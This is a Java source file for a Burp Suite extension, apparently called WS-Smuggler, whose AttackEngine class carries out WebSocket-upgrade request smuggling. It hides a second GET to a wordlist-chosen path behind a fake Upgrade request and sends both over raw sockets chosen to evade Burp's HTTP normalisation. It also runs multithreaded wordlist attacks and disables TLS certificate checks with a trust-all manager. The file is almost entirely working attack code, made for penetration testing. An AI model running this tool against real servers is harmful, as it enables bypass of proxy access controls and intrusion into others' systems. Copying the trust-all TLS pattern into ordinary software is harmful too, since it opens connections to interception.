package burp;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.core.ByteArray;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;

import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocket;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.security.SecureRandom;
import java.security.cert.X509Certificate;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

public class AttackEngine {

    public interface AttackListener {
        void onAttackStarted(int id, String host, String payload, String timestamp);
        void onAttackComplete(int id, AttackLog log, ResponseAnalyzer.ResponseAnalysis analysis);
        void onAttackError(int id, String errorMessage);
        void onBatchComplete();
        void onProgressUpdate(int completed, int total);
    }

    private final MontoyaApi api;
    private final AttackListener listener;
    private final AtomicInteger requestIdCounter = new AtomicInteger(1);
    private final SSLSocketFactory sslSocketFactory;

    private volatile boolean isRunning = false;
    private volatile boolean isPaused = false;
    private ExecutorService executor;

    public AttackEngine(MontoyaApi api, AttackListener listener) {
        this.api = api;
        this.listener = listener;
        this.sslSocketFactory = createTrustAllSSLFactory();
    }

    public boolean isRunning() { return isRunning; }
    public boolean isPaused() { return isPaused; }

    public void togglePause() {
        isPaused = !isPaused;
        api.logging().logToOutput(isPaused ? "Attack Paused." : "Attack Resumed.");
    }

    public void stop() {
        isRunning = false;
        isPaused = false;
        if (executor != null && !executor.isShutdown()) {
            executor.shutdownNow();
        }
        api.logging().logToOutput("Attack Stopped by User.");
    }

    public void performSingleAttack(HttpRequestResponse baseRequest, AttackConfig config) {
        Thread t = new Thread(() -> {
            try {
                executeAttack(baseRequest, config, null);
            } catch (Throwable ex) {
                api.logging().logToError("Thread crashed: " + ex.getMessage());
                ex.printStackTrace(api.logging().error());
            }
        }, "WS-Smuggler-Single");
        t.setDaemon(true);
        t.start();
    }

    public void performWordlistAttack(HttpRequestResponse baseRequest, AttackConfig config,
                                      List<String> wordlist) {
        if (baseRequest == null || wordlist == null || wordlist.isEmpty()) return;

        isRunning = true;
        isPaused = false;

        executor = Executors.newFixedThreadPool(config.getThreadCount(), r -> {
            Thread t = new Thread(r);
            t.setDaemon(true);
            return t;
        });

        AtomicInteger completed = new AtomicInteger(0);
        int total = wordlist.size();

        Thread coordinator = new Thread(() -> {
            try {
                List<Future<?>> futures = new ArrayList<>();
                for (String payload : wordlist) {
                    if (!isRunning) break;

                    while (isPaused && isRunning) {
                        try { Thread.sleep(200); }
                        catch (InterruptedException e) { Thread.currentThread().interrupt(); break; }
                    }
                    if (!isRunning) break;

                    futures.add(executor.submit(() -> {
                        try {
                            executeAttack(baseRequest, config, payload);
                            listener.onProgressUpdate(completed.incrementAndGet(), total);
                        } catch (Throwable t) {
                            api.logging().logToError("Worker thread crashed: " + t.getMessage());
                            t.printStackTrace(api.logging().error());
                        }
                    }));

                    if (config.getRequestDelayMs() > 0) {
                        try { Thread.sleep(config.getRequestDelayMs()); }
                        catch (InterruptedException e) { Thread.currentThread().interrupt(); break; }
                    }
                }

                for (Future<?> f : futures) {
                    if (!isRunning) break;
                    try { f.get(config.getSocketTimeoutMs() + 5000L, TimeUnit.MILLISECONDS); }
                    catch (Exception ignored) {}
                }
            } catch (Throwable t) {
                api.logging().logToError("Wordlist coordinator thread crashed: " + t.getMessage());
                t.printStackTrace(api.logging().error());
            } finally {
                isRunning = false;
                isPaused = false;
                if (executor != null) executor.shutdown();
                listener.onBatchComplete();
                api.logging().logToOutput("Wordlist attack finished.");
            }
        }, "WS-Smuggler-Coordinator");
        coordinator.setDaemon(true);
        coordinator.start();
    }

    private void executeAttack(HttpRequestResponse baseRequest, AttackConfig config, String payload) {
        int id = requestIdCounter.getAndIncrement();
        String host = baseRequest.httpService().host();
        int port = baseRequest.httpService().port();
        boolean isSecure = baseRequest.httpService().secure();
        String timestamp = new SimpleDateFormat("HH:mm:ss").format(new Date());

        listener.onAttackStarted(id, host, payload, timestamp);

        String baitPath = config.getBaitPath();
        String smuggledPath = config.resolveSmugglePath(payload);

        String fullRequestStr =
                "GET " + baitPath + " HTTP/1.1\r\n" +
                "Host: " + host + ":" + port + "\r\n" +
                "Connection: Upgrade\r\n" +
                "Upgrade: websocket\r\n" +
                "Sec-WebSocket-Version: " + config.getWsVersion() + "\r\n" +
                "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n" +
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\n" +
                "\r\n" +
                "GET " + smuggledPath + " HTTP/1.1\r\n" +
                "Host: " + host + ":" + port + "\r\n" +
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\n" +
                "\r\n";

        try (Socket socket = createSocket(host, port, isSecure)) {
            socket.setSoTimeout(config.getSocketTimeoutMs());

            OutputStream out = socket.getOutputStream();
            InputStream in = socket.getInputStream();

            out.write(fullRequestStr.getBytes());
            out.flush();

            ByteArrayOutputStream buffer = new ByteArrayOutputStream();
            byte[] data = new byte[4096];
            int nRead;
            try {
                while ((nRead = in.read(data, 0, data.length)) != -1) {
                    buffer.write(data, 0, nRead);
                }
            } catch (Exception ignored) {
                // Expected on socket timeout — tunnel stays open
            }

            byte[] responseBytes = buffer.toByteArray();
            ResponseAnalyzer.ResponseAnalysis analysis = ResponseAnalyzer.analyze(responseBytes);

            HttpRequest burpReq = HttpRequest.httpRequest(baseRequest.httpService(), fullRequestStr);
            HttpResponse burpRes = HttpResponse.httpResponse(ByteArray.byteArray(responseBytes));

            listener.onAttackComplete(id, new AttackLog(burpReq, burpRes, analysis), analysis);

        } catch (Exception ex) {
            listener.onAttackError(id, ex.getMessage());
            api.logging().logToError("Attack error (ID " + id + "): " + ex.getMessage());
        }
    }

    private Socket createSocket(String host, int port, boolean isSecure) throws IOException {
        // Using raw sockets instead of api.http().sendRequest() to intentionally bypass 
        // Burp's strict HTTP parsing and content-length normalization, which is fundamentally
        // required for protocol smuggling to work.
        if (isSecure) {
            SSLSocket ssl = (SSLSocket) sslSocketFactory.createSocket(host, port);
            ssl.startHandshake();
            return ssl;
        }
        return new Socket(host, port);
    }

    private SSLSocketFactory createTrustAllSSLFactory() {
        try {
            TrustManager[] trustAll = {new X509TrustManager() {
                public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }
                public void checkClientTrusted(X509Certificate[] c, String t) {}
                public void checkServerTrusted(X509Certificate[] c, String t) {}
            }};
            SSLContext ctx = SSLContext.getInstance("TLS");
            ctx.init(null, trustAll, new SecureRandom());
            return ctx.getSocketFactory();
        } catch (Exception e) {
            api.logging().logToError("SSL factory creation failed, using default: " + e.getMessage());
            return (SSLSocketFactory) SSLSocketFactory.getDefault();
        }
    }
}
